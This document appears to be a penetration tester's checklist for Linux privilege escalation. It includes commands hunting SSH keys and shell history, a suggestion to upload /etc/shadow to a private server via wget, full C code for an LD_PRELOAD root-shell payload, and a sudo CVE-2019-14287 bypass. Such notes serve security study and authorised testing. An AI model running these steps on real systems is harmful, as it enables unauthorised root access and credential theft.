# ***Manual Linux Privilege Escalation Checks***

## **[KERNEL EXPLOITS]**

*An outdated kernel version may lead to easy wins.*

    uname -a


## **[PASSWORDS AND FILE PERMISSIONS]**

*A password or sensitive file disclosure can give us important information.*

### *Stored Passwords*

    history
    cat .bash_history


### *Weak File Permissions*

Look for **read or write** permissions to `/etc/shadow`

Look for **write** permission to `/etc/passwd`


### *SSH Keys*

    find / -name id_rsa 2>/dev/null
    find / -name authorized_keys 2>/dev/null
    
## **[SUDO]**

*Abusing sudo to gain root.*

### *Sudo Shell Escaping*

    sudo -l

Shell escape using an exploitable binary using [GTFOBins](https://gtfobins.github.io/)

### *Intended Functionality*

Is there any intended functionality we can abuse from a sudo'able binary? Example: use `wget` to upload the `/etc/shadow` file to our private server?

### *`env_keep+=ENV_PRELOAD` is present*

*We want to use the ENV_PRELOAD feature in order to preload a malicious payload.*

1. Create the following C script named `<NAME>.so`

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Compile it : `gcc -fPIC -shared -o <NAME>.so <NAME>.c -nostartfiles`

3. Set LD_PRELOAD as shell.so : `sudo LD_PRELOAD=<PATH TO SHELL FILE> <ANY SUDO'ABLE COMMAND>`

### *Version Specific Exploits*

#### *Abusing CVE-2019-14287 (sudo version <1.8.28)*

[CVE-2019-14287](https://www.exploit-db.com/exploits/47502) Comes in handy if we can sudo as any user, except root (`!root`).

1. Check sudo version: `sudo -V`

2. If the sudo version is below 1.8.28, use this command to run as root: `sudo -u#-1 <COMMAND>`

#### *Abusing CVE-2019-18634 (sudo version <1.8.26)*
[Exploit for CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634). Works if `pw feedback` is present.

1. Check sudo version: `sudo -V`

2. Run the exploit.

## **SUID**

WIP
